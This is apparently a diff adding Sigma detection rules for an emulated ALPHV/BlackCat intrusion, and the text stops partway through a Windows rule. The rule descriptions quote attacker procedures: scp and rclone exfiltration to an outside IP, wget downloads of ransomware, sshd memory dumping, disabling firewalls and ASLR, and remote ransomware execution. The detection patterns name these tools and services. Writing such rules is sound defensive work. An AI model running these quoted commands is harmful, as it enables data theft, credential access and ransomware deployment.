@@ -1,0 +1,1872 @@
+# ═══════════════════════════════════════════════════════════════════════════
+#  LINUX RULES  (L01–L19)
+# ═══════════════════════════════════════════════════════════════════════════
+
+---
+
+title: ALPHV rclone WebDAV Listener on Attacker Infrastructure
+id: aa255d9f-995d-41a9-84ba-e4949f564c97
+name: L01
+status: experimental
+description: >
+  Detects rclone started in WebDAV server mode, binding to a non-loopback
+  address.  Procedure S1: rclone serve webdav /srv/http --addr 176.59.1.18:8080
+  (T1048.003).  Attacker hosts a WebDAV endpoint to receive exfiltrated data.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.exfiltration
+  - attack.t1048.003
+  - attack.command_and_control
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_serve:
+    Image|endswith: '/rclone'
+    CommandLine|contains|all:
+      - 'serve'
+      - 'webdav'
+  filter_loopback:
+    CommandLine|contains:
+      - '--addr 127.'
+      - '--addr ::1'
+      - '--addr localhost'
+  condition: selection_serve and not filter_loopback
+falsepositives:
+  - Legitimate rclone WebDAV mounts for cloud storage workflows
+level: high
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [1]
+
+---
+
+title: Attacker C2 Control Server Binary Execution from Build Path
+id: b7f3a100-e145-4c88-a7a1-cb62a1e4bb21
+name: L02
+status: experimental
+description: >
+  Detects execution of a C2 framework controller binary (controlServer) from a
+  non-standard directory with a YAML config argument.
+  Procedure S2: ./controlServer -c config/msr2_handler_config.yml (T1105).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.command_and_control
+  - attack.t1105
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_c2:
+    Image|endswith: '/controlServer'
+  selection_c2_alt:
+    CommandLine|contains:
+      - 'controlServer'
+      - 'msr2_handler_config'
+  condition: 1 of selection_*
+falsepositives:
+  - Internal monitoring or operations tooling
+level: critical
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [2]
+
+---
+
+title: SSH Interactive Bash Login Shell Used for Lateral Movement
+id: c84f56d2-3af2-4f3c-9d82-b1f7e3a2cd4e
+name: L03
+status: experimental
+description: >
+  Detects SSH client spawning a bash -l (login) or bash shell interactively
+  on a remote host, a pattern typical of adversary lateral movement via
+  compromised credentials.
+  Procedure S3: ssh user@10.30.10.4 "bash -l"; S4: ssh windesk@10.20.20.11
+  "sudo -i"; S10: ssh user@10.20.10.122 "bash -l" (T1021.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.lateral_movement
+  - attack.t1021.001
+  - attack.initial_access
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_bash_shell:
+    Image|endswith: '/ssh'
+    CommandLine|contains:
+      - '"bash -l"'
+      - '"bash -s"'
+      - '"sudo -i"'
+      - '"sudo bash"'
+  selection_sudo_remote:
+    Image|endswith: '/ssh'
+    CommandLine|contains|all:
+      - '-t '
+      - 'sudo'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate system administration using interactive SSH
+level: medium
+x-gbse-telemetry: [identity, network, process]
+x-gbse-steps: [3, 4, 10]
+
+---
+
+title: ldapsearch Domain User Account Enumeration via LDAP
+id: d92c3b17-8fe4-4b2a-a5d3-c7e1f0842db3
+name: L04
+status: experimental
+description: >
+  Detects ldapsearch querying for domain user accounts (objectClass=user) via
+  LDAP, the Linux equivalent of PowerShell LDAP queries.
+  Procedure S5: ldapsearch -x -LLL -H ldap://... objectClass=user (T1087.002).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1087.002
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '/ldapsearch'
+    CommandLine|contains:
+      - 'objectClass=user'
+      - 'objectClass=Person'
+      - 'sAMAccountName'
+  condition: selection
+falsepositives:
+  - Legitimate LDAP directory queries by directory services teams
+level: medium
+x-gbse-telemetry: [network, process]
+x-gbse-steps: [5]
+
+---
+
+title: ldapsearch Domain Computer Account Discovery
+id: e3a7f224-9bc5-4d13-8fa1-d4b2e591cc67
+name: L05
+status: experimental
+description: >
+  Detects ldapsearch enumerating computer accounts (objectClass=computer),
+  the Linux equivalent of Get-ADComputer.
+  Procedure S7: ldapsearch -x -LLL -H ldap://... objectClass=computer (T1018).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1018
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '/ldapsearch'
+    CommandLine|contains:
+      - 'objectClass=computer'
+      - 'objectClass=Computer'
+      - 'cn ipHostNumber'
+  condition: selection
+falsepositives:
+  - IT inventory scripts, Puppet/Ansible node discovery
+level: low
+x-gbse-telemetry: [network, process]
+x-gbse-steps: [7]
+
+---
+
+title: Local Account Enumeration via /etc/passwd Read
+id: f1b8e935-0cd4-4e74-9c23-e5a3f692dd80
+name: L06
+status: experimental
+description: >
+  Detects processes reading /etc/passwd to extract local usernames, the Linux
+  equivalent of `net user` for local account discovery.
+  Procedure S6: cut -d: -f1 /etc/passwd (T1087.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1087.001
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_cut:
+    Image|endswith: '/cut'
+    CommandLine|contains: '/etc/passwd'
+  selection_awk_cat:
+    Image|endswith:
+      - '/awk'
+      - '/cat'
+      - '/grep'
+    CommandLine|contains: '/etc/passwd'
+  condition: 1 of selection_*
+falsepositives:
+  - Shell profiles, PAM configuration scripts, getent wrappers
+level: low
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [6]
+
+---
+
+title: wget Executable Binary Download to Staging Path
+id: a2c4d601-7f3e-4b19-8c47-f9b1e2a3dd5c
+name: L07
+status: experimental
+description: >
+  Detects wget downloading PE executables (.exe) or unknown binaries directly
+  to /tmp or /dev/shm staging paths from external URLs. ALPHV/BlackCat uses
+  this pattern to stage InfoStealer (netbnmp.exe), ExMatter (collector1.exe),
+  and BlackCat Linux/Windows ransomware (digirevenge/digirevenge.exe).
+  Procedure S8,S11,S18,S22,S26: wget http://theinator.com/digirevenge/... (T1105).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.command_and_control
+  - attack.t1105
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_pe_download:
+    Image|endswith: '/wget'
+    CommandLine|contains: '.exe'
+  selection_pe_download_paths:
+    Image|endswith: '/wget'
+    CommandLine|contains:
+      - '-O /tmp/'
+      - '-O /dev/shm/'
+      - '-P /tmp'
+  selection_known_domain:
+    Image|endswith: '/wget'
+    CommandLine|contains: 'theinator.com'
+  selection_staging_no_ext:
+    Image|endswith: '/wget'
+    CommandLine|contains|all:
+      - '-O /tmp/'
+      - 'http'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate package downloads via wget in CI/CD pipelines
+level: high
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [8, 11, 18, 22, 26]
+
+---
+
+title: Wine Windows PE Execution for Credential Access
+id: b517adfd-ef87-4410-9546-e5f2e1b3d2f3
+name: L08
+status: experimental
+description: >
+  Detects Wine used to execute Windows PE files from /tmp with credential-
+  dumping arguments (base64, dpapi, localhost, zorimoto), characteristic of
+  the ALPHV/BlackCat InfoStealer (netbnmp.exe).
+  Procedure S9: wine /tmp/netbnmp.exe base64 localhost zorimoto ... (T1003.001).
+  Procedure S12: wine /tmp/netbnmp.exe dpapi localhost ... (T1003.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+  - attack.execution
+  - attack.t1204.002
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_cred_args:
+    Image|endswith: '/wine'
+    CommandLine|contains:
+      - 'dpapi'
+      - 'base64'
+      - 'zorimoto'
+  selection_tmp_pe:
+    Image|endswith: '/wine'
+    CommandLine|contains|all:
+      - '/tmp/'
+      - '.exe'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate Wine applications running from /tmp (rare in production)
+level: critical
+x-gbse-telemetry: [identity, process]
+x-gbse-steps: [9, 12]
+
+---
+
+title: systemctl Security Service Stop and Disable
+id: f7755807-6060-4660-b62f-4b8f7130be64
+name: L09
+status: experimental
+description: >
+  Detects systemctl stopping or disabling host security services (firewall,
+  AV, IDS), the Linux equivalent of `sc stop` / `Set-MpPreference -Disable`.
+  Procedure S13: systemctl stop firewalld && systemctl disable firewalld (T1562.001).
+  Procedure S14: systemctl stop clamav-freshclam && disable (T1562.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_firewall:
+    Image|endswith: '/systemctl'
+    CommandLine|contains:
+      - 'stop firewalld'
+      - 'disable firewalld'
+      - 'stop ufw'
+      - 'disable ufw'
+      - 'stop iptables'
+  selection_av:
+    Image|endswith: '/systemctl'
+    CommandLine|contains:
+      - 'stop clamav'
+      - 'disable clamav'
+      - 'stop apparmor'
+      - 'disable apparmor'
+      - 'stop fail2ban'
+      - 'stop aide'
+  condition: 1 of selection_*
+falsepositives:
+  - Planned firewall maintenance by system administrators
+level: high
+x-gbse-telemetry: [process]
+x-gbse-steps: [13, 14]
+
+---
+
+title: sysctl Kernel Security Parameter Modification
+id: 6b00cd98-89e3-458c-9ed7-10af8c451609
+name: L10
+status: experimental
+description: >
+  Detects sysctl used to disable kernel security features (ASLR, ptrace
+  restrictions, perf paranoia), the Linux analogue of registry modifications
+  that weaken exploit mitigations.
+  Procedure S15: sysctl -w kernel.randomize_va_space=0 (T1112).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.defense_evasion
+  - attack.t1112
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_aslr:
+    Image|endswith: '/sysctl'
+    CommandLine|contains: 'kernel.randomize_va_space=0'
+  selection_ptrace:
+    Image|endswith: '/sysctl'
+    CommandLine|contains:
+      - 'kernel.yama.ptrace_scope=0'
+      - 'kernel.perf_event_paranoid=-1'
+  condition: 1 of selection_*
+falsepositives:
+  - Kernel tuning scripts, security benchmark hardening scripts that restore defaults
+level: high
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [15]
+
+---
+
+title: gcore Process Memory Dump for Credential Extraction
+id: 3e8f1a42-2c97-4d6b-b831-f3c9a5d7e021
+name: L11
+status: experimental
+description: >
+  Detects gcore creating a core dump of a running process for offline credential
+  extraction, the Linux equivalent of Task Manager / ProcDump LSASS dump.
+  Procedure S16: gcore -o /tmp/lsass_dump $(pgrep -u root -f sshd) (T1003.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '/gcore'
+    CommandLine|contains: '-o'
+  selection_staging:
+    Image|endswith: '/gcore'
+    CommandLine|contains:
+      - '/tmp/'
+      - '/dev/shm/'
+  condition: 1 of selection*
+falsepositives:
+  - Developer crash dump collection for application debugging
+level: high
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [16]
+
+---
+
+title: rclone Data Exfiltration to Remote WebDAV Endpoint
+id: ffa1c964-8242-4b8b-8924-1182290cc226
+name: L12
+status: experimental
+description: >
+  Detects rclone copying files to a named WebDAV remote (webdav:), indicating
+  data exfiltration via the rclone WebDAV listener established earlier.
+  Procedure S17: rclone copy /tmp/lsass_dump.000 webdav: (T1048.003).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.exfiltration
+  - attack.t1048.003
+  - attack.command_and_control
+  - attack.t1071.001
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_copy:
+    Image|endswith: '/rclone'
+    CommandLine|contains: 'copy'
+  selection_webdav:
+    Image|endswith: '/rclone'
+    CommandLine|contains:
+      - 'webdav:'
+      - ':webdav'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate rclone backups to WebDAV-based cloud storage (NextCloud, SharePoint)
+level: high
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [17]
+
+---
+
+title: nmap Ping Sweep Internal Network Discovery
+id: 951246df-080c-49c1-9bd9-f816b1cfd5b2
+name: L13
+status: experimental
+description: >
+  Detects nmap performing a ping sweep (-sn) of internal subnets to identify
+  live hosts for lateral movement staging.
+  Procedure S19: nmap -sn 10.20.20.0/24 10.20.10.0/24 (T1046).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1046
+  - attack.reconnaissance
+  - attack.t1595.001
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_pingsweep:
+    Image|endswith: '/nmap'
+    CommandLine|contains: '-sn'
+  selection_portscan:
+    Image|endswith: '/nmap'
+    CommandLine|contains:
+      - '-sV'
+      - '-sT'
+      - '-sS'
+      - '-p-'
+      - '--open'
+  condition: 1 of selection_*
+falsepositives:
+  - Authorized network inventory scans, vulnerability assessments
+level: medium
+x-gbse-telemetry: [network, process]
+x-gbse-steps: [19]
+
+---
+
+title: scp Batch Deployment to Multiple Internal Hosts via Loop
+id: 75d1d799-87ef-4bd9-ab3c-c59429aaf151
+name: L14
+status: experimental
+description: >
+  Detects scp transferring payloads from /tmp to multiple remote internal hosts
+  in sequence, characteristic of ransomware staging across a compromised network
+  using admin credentials (Windows Admin Shares equivalent via SSH).
+  Procedure S20: for host in ...; do scp /tmp/collector1.exe host:/tmp/ ... (T1077).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.lateral_movement
+  - attack.t1077
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_tmp_deploy:
+    Image|endswith: '/scp'
+    CommandLine|contains:
+      - '/tmp/collector'
+      - '/tmp/digirevenge'
+      - '/tmp/netbnmp'
+  selection_batch_pattern:
+    Image|endswith: '/scp'
+    CommandLine|contains|all:
+      - '/tmp/'
+      - '.exe'
+      - '/tmp/'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate configuration management deployment (Ansible, Fabric)
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [20]
+
+---
+
+title: Windows PE or Wine Binary Execution from Staging Path
+id: 85768e4a-54ab-456f-ab91-310ede66a0a6
+name: L15
+status: experimental
+description: >
+  Detects execution of a PE binary (.exe) directly from /tmp or wine wrapping
+  a PE from /tmp. Covers ExMatter execution (collector1.exe) and ALPHV/BlackCat
+  Windows ransomware execution under Wine (digirevenge.exe).
+  Procedure S21: /tmp/collector1.exe (T1059.001).
+  Procedure S27: wine /tmp/digirevenge.exe --access-token 15742aa362a84ba3 (T1059.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.execution
+  - attack.t1059.001
+  - attack.t1204.002
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_direct_pe:
+    Image|startswith: '/tmp/'
+    Image|endswith: '.exe'
+  selection_wine_blackcat:
+    Image|endswith: '/wine'
+    CommandLine|contains:
+      - '--access-token'
+      - 'digirevenge'
+  selection_wine_generic:
+    Image|endswith: '/wine'
+    CommandLine|contains: '/tmp/'
+    CommandLine|endswith: '.exe'
+  condition: 1 of selection_*
+falsepositives:
+  - Developers testing Windows applications under Wine from temp directories
+level: high
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [21, 27]
+
+---
+
+title: scp Lateral File Transfer of Tool or Payload
+id: c3e5d891-4f17-4b28-9c34-a6d8f2b3cc7e
+name: L16
+status: experimental
+description: >
+  Detects scp transferring binaries or data files between internal or attacker
+  hosts. Covers ransomware binary staging to KVM server (S23) and log file
+  retrieval (S25).
+  Procedure S23: scp /tmp/digirevenge marakawa@10.20.10.16:/tmp/ (T1021.004).
+  Procedure S25: scp ... bc.log ~/kvm.log (T1105).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.command_and_control
+  - attack.t1021.004
+  - attack.t1105
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_payload_transfer:
+    Image|endswith: '/scp'
+    CommandLine|contains: '/tmp/'
+  selection_log_retrieval:
+    Image|endswith: '/scp'
+    CommandLine|contains: '.log'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate SCP file transfers between managed hosts
+level: medium
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [23, 25]
+
+---
+
+title: SSH Remote Shell with chmod and Ransomware Execution
+id: d4f7a219-6c83-4e39-b541-a7c9f1d2ee3f
+name: L17
+status: experimental
+description: >
+  Detects ssh -t invoking chmod +x followed by privileged execution of a
+  newly downloaded binary with access tokens, characteristic of ALPHV/BlackCat
+  Linux ransomware deployment to hypervisor hosts.
+  Procedure S24: ssh -t ... "chmod +x /tmp/digirevenge && sudo /tmp/digirevenge
+  --access-token 15742aa362a84ba3" (T1059.004).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.execution
+  - attack.t1059.004
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_chmod_exec:
+    Image|endswith: '/ssh'
+    CommandLine|contains|all:
+      - '-t '
+      - 'chmod +x'
+  selection_access_token:
+    Image|endswith: '/ssh'
+    CommandLine|contains: '--access-token'
+  condition: 1 of selection_*
+falsepositives:
+  - Deployment scripts that use SSH to install and run packages on remote hosts
+level: critical
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [24]
+
+---
+
+title: smbclient Admin Share File Collection via Get
+id: e5a9b307-7d24-4c51-a632-f8e4d3c5ff81
+name: L18
+status: experimental
+description: >
+  Detects smbclient connecting to Windows admin share C$ and retrieving files
+  using the -c "get" command. Used by ALPHV to collect BlackCat Windows
+  ransomware operation logs from compromised hosts.
+  Procedure S28: smbclient //${host}/C$ -U domain\user%pass -c "get clog.xtlog" (T1083).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.collection
+  - attack.t1083
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_admin_share:
+    Image|endswith: '/smbclient'
+    CommandLine|contains: '/C$'
+  selection_get_op:
+    Image|endswith: '/smbclient'
+    CommandLine|contains|all:
+      - '-c '
+      - 'get '
+  condition: 1 of selection_*
+falsepositives:
+  - IT administrators retrieving files from Windows shares via Linux hosts
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [28]
+
+---
+
+title: scp Exfiltration to External Attacker-Controlled Host
+id: ea8f46a0-d96f-4b7c-b8c2-a6590b6caec1
+name: L19
+status: experimental
+description: >
+  Detects scp uploading archive files (.zip, .tar, .gz) or data to an external
+  attacker-controlled IP address outside the internal subnet range.
+  Procedure S29: scp $zipPath op1@176.59.1.18:/tmp/sblogs.zip (T1048.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.exfiltration
+  - attack.t1048.001
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_zip_exfil:
+    Image|endswith: '/scp'
+    CommandLine|contains:
+      - '.zip'
+      - '.tar.gz'
+      - '.tar.xz'
+      - 'sblogs'
+  selection_known_c2:
+    Image|endswith: '/scp'
+    CommandLine|contains: '176.59.1.18'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate SCP-based backup transfers to off-site storage
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [29]
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  WINDOWS RULES  (W01–W19)
+# Windows SIEM context for G_c technique-tag coverage
+# These rules detect Windows-native equivalents of the same ATT&CK techniques
+# ═══════════════════════════════════════════════════════════════════════════
+
+---
+
+title: rclone WebDAV Server Started on Windows Host
+id: aa3b5d9f-112e-4c88-a7f1-cb82b1e5cc31
+name: W01
+status: experimental
+description: >
+  Detects rclone.exe started in WebDAV server mode on Windows, binding to
+  a non-loopback address. Windows equivalent of Linux S1 (T1048.003).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.exfiltration
+  - attack.t1048.003
+  - attack.command_and_control
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\rclone.exe'
+    CommandLine|contains|all:
+      - 'serve'
+      - 'webdav'
+  filter_loopback:
+    CommandLine|contains:
+      - '--addr 127.'
+      - '--addr ::1'
+  condition: selection and not filter_loopback
+falsepositives:
+  - Legitimate rclone WebDAV use for cloud sync operations
+level: high
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [1]
+
+---
+
+title: C2 Framework or RAT Binary Executed from Non-Standard Directory
+id: 67ad2295-1026-4a94-b64c-411e9735e29d
+name: W02
+status: experimental
+description: >
+  Detects execution of a controller binary or tool server from a non-standard
+  path (not Program Files, Windows, or System32). Windows equivalent of S2 (T1105).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.command_and_control
+  - attack.t1105
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_staging_paths:
+    Image|contains:
+      - '\Users\Public\'
+      - '\Windows\Temp\'
+      - '\ProgramData\'
+      - '\AppData\Local\Temp\'
+    Image|endswith:
+      - 'Server.exe'
+      - 'Controller.exe'
+      - 'Handler.exe'
+  condition: selection_staging_paths
+falsepositives:
+  - Legitimate portable applications run from user directories
+level: medium
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [2]
+
+---
+
+title: mstsc.exe RDP Connection to Internal Host
+id: 742dd37d-ce5d-49ea-b780-131e9274cddf
+name: W03
+status: experimental
+description: >
+  Detects mstsc.exe establishing a Remote Desktop connection to an internal host
+  using the /v: flag. Windows native equivalent of SSH lateral movement (T1021.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.lateral_movement
+  - attack.initial_access
+  - attack.t1021.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\mstsc.exe'
+    CommandLine|contains: '/v:'
+  filter_localhost:
+    CommandLine|contains:
+      - '/v:localhost'
+      - '/v:127.0.0.1'
+  condition: selection and not filter_localhost
+falsepositives:
+  - Legitimate administrator RDP sessions to internal servers
+level: medium
+x-gbse-telemetry: [identity, network, process]
+x-gbse-steps: [3, 4, 10]
+
+---
+
+title: PowerShell or nltest Domain User Account Enumeration
+id: b06972c9-ae8b-4f80-99a3-0a06f3edbbd3
+name: W04
+status: experimental
+description: >
+  Detects PowerShell or nltest used to enumerate domain user accounts via LDAP
+  or directory services. Windows equivalent of ldapsearch objectClass=user (T1087.002).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1087.002
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_powershell:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - 'Get-ADUser'
+      - 'Get-DomainUser'
+      - 'objectClass=user'
+      - 'sAMAccountName'
+  selection_nltest:
+    Image|endswith: '\nltest.exe'
+    CommandLine|contains: '/domain_trusts'
+  selection_net_user:
+    Image|endswith: '\net.exe'
+    CommandLine|contains|all:
+      - 'user'
+      - '/domain'
+  condition: 1 of selection_*
+falsepositives:
+  - IT helpdesk and HR scripts enumerating user accounts
+level: medium
+x-gbse-telemetry: [identity, network, process]
+x-gbse-steps: [5]
+
+---
+
+title: PowerShell AD Computer Discovery
+id: 78e52ab1-1707-4d9f-910a-4d93ce15a6a2
+name: W05
+status: experimental
+description: >
+  Detects PowerShell enumerating domain-joined computers via Get-ADComputer or
+  Get-DomainComputer. Windows equivalent of ldapsearch objectClass=computer (T1018).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1018
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - 'Get-ADComputer'
+      - 'Get-DomainComputer'
+      - 'objectClass=computer'
+  selection_ping_sweep:
+    Image|endswith:
+      - '\ping.exe'
+      - '\nmap.exe'
+    CommandLine|contains: '/24'
+  condition: 1 of selection*
+falsepositives:
+  - Authorized network inventory and asset management scripts
+level: low
+x-gbse-telemetry: [network, process]
+x-gbse-steps: [7]
+
+---
+
+title: net.exe Local User Account Discovery
+id: fd2d8983-3eb5-48f0-9e24-d28993421e46
+name: W06
+status: experimental
+description: >
+  Detects net.exe enumerating local user accounts, the Windows equivalent of
+  `cut -d: -f1 /etc/passwd` for local account discovery (T1087.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1087.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\net.exe'
+    CommandLine|contains: 'user'
+  filter_with_add:
+    CommandLine|contains:
+      - 'user /add'
+      - 'user /delete'
+  condition: selection and not filter_with_add
+falsepositives:
+  - Helpdesk scripts listing user accounts for auditing
+level: low
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [6]
+
+---
+
+title: bitsadmin PE Binary Staging Download
+id: d7f49012-7001-43b4-8d00-fd04ac741400
+name: W07
+status: experimental
+description: >
+  Detects bitsadmin.exe or certutil.exe downloading executables from external
+  URLs to staging paths. Windows equivalent of wget PE download (T1105, T1197).
+  KEY RULE: T1105 technique-tag ensures sigma coverage at all T1105 steps in G_c.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.command_and_control
+  - attack.t1105
+  - attack.defense_evasion
+  - attack.t1197
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_bitsadmin:
+    Image|endswith: '\bitsadmin.exe'
+    CommandLine|contains: '/transfer'
+  selection_bitsadmin_url:
+    Image|endswith: '\bitsadmin.exe'
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+  selection_certutil:
+    Image|endswith: '\certutil.exe'
+    CommandLine|contains:
+      - '-urlcache'
+      - '-split'
+  filter_legitimate:
+    CommandLine|contains:
+      - 'windowsupdate'
+      - 'microsoft.com'
+      - 'windows.com'
+  condition: ((selection_bitsadmin and selection_bitsadmin_url) or selection_certutil) and not filter_legitimate
+falsepositives:
+  - SCCM, WSUS, and legitimate BITS-based software distribution
+level: high
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [2, 8, 11, 18, 22, 25, 26]
+
+---
+
+title: InfoStealer LSASS Credential Access via Named Pipe or Direct Read
+id: a01b8329-5953-4f73-ae2d-aa01e1f35f00
+name: W08
+status: experimental
+description: >
+  Detects credential dumping tools accessing LSASS or using DPAPI for credential
+  extraction. Windows equivalent of wine netbnmp.exe credential dump (T1003.001).
+  Detects: custom infostealers, Mimikatz, or similar tools using dpapi/lsass args.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_dpapi_args:
+    CommandLine|contains:
+      - 'dpapi'
+      - 'sekurlsa'
+      - 'lsadump'
+  selection_lsass_tools:
+    Image|endswith:
+      - '\procdump.exe'
+      - '\procdump64.exe'
+      - '\mimikatz.exe'
+    CommandLine|contains:
+      - '-ma lsass'
+      - 'lsass.exe'
+  condition: 1 of selection_*
+falsepositives:
+  - Authorized security assessment using ProcDump for LSASS forensics
+level: critical
+x-gbse-telemetry: [identity, process]
+x-gbse-steps: [9, 12]
+
+---
+
+title: Security Software Process Terminate or Service Stop
+id: c0c76b39-8e80-4009-8da4-0484b5600c3b
+name: W09
+status: experimental
+description: >
+  Detects sc.exe, taskkill, or net.exe stopping or disabling security software
+  processes or services. Windows equivalent of systemctl disable firewalld/clamav.
+  Procedure S13, S14 Windows analog: sc stop/disable AV, taskkill /f MsMpEng.exe
+  (T1562.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_sc_stop_action:
+    Image|endswith: '\sc.exe'
+    CommandLine|contains:
+      - ' stop '
+      - ' delete '
+      - ' disable '
+  selection_sc_stop_av:
+    Image|endswith: '\sc.exe'
+    CommandLine|contains:
+      - 'MsMpEng'
+      - 'SentinelAgent'
+      - 'cbdefense'
+      - 'falcon'
+      - 'crowdstrike'
+      - 'WinDefend'
+  selection_taskkill_force:
+    Image|endswith: '\taskkill.exe'
+    CommandLine|contains: '/f'
+  selection_taskkill_av:
+    Image|endswith: '\taskkill.exe'
+    CommandLine|contains:
+      - 'MsMpEng'
+      - 'SentinelOne'
+      - 'falcon'
+  condition: (selection_sc_stop_action and selection_sc_stop_av) or (selection_taskkill_force and selection_taskkill_av)
+falsepositives:
+  - Authorized security software maintenance and upgrades
+level: high
+x-gbse-telemetry: [process]
+x-gbse-steps: [13, 14]
+
+---
+
+title: Registry ASLR Exploit Mitigation Disable
+id: 36e1c0ff-0580-4b64-b7b0-27c4e41d5c4f
+name: W10
+status: experimental
+description: >
+  Detects reg.exe disabling ASLR (MoveImages=0 or ProcessEnableVa=0) or
+  CFG/DEP mitigations via IFEO or MitigationOptions.
+  Windows equivalent of sysctl kernel.randomize_va_space=0 (T1112).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.defense_evasion
+  - attack.t1112
+logsource:
